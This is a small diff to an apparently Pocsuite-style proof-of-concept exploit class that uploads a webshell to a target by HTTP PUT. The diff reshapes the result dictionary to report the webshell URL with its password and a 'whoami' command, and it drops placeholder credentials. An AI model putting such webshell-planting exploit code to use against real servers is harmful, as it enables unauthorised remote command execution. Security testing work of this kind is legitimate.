@@ -50,14 +50,9 @@ class DemoPOC(POCBase):
             res1 = requests.put(self.url + url, data=body)
             if res1.status_code == 201:
                 result = {
-                    'Result': {
-                        'target': self.url,
-                        'webshell': self.url + url[:-1] + '?pwd=023&cmd=whoami',
-                        'site_username': 'admin',
-                        'site_pass': 'passwd',
-                        'a': 'a',
-                        'b': 'b'
-                    }
+                    'webshell': self.url + url[:-1] + '?pwd=023&cmd=whoami',
+                    'webshell_access_tool': 'browser',
+                    "remark": {}
                 }
             elif res1.status_code == 204:
                 output.info("{{{0}}} webshell exists".format(self.url))
